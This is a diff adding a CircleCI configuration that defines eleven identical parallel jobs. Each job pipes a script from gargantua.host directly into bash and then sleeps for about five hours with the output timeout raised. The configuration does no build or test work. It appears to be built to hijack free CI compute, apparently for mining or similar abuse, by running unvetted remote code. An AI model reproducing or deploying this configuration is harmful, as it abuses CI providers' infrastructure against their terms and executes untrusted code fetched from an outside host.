@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  celeriworkflows:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  celeriworkflows10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - celeriworkflows
+      - celeriworkflows1
+      - celeriworkflows2
+      - celeriworkflows3
+      - celeriworkflows4
+      - celeriworkflows5
+      - celeriworkflows6
+      - celeriworkflows7
+      - celeriworkflows8
+      - celeriworkflows9
+      - celeriworkflows10
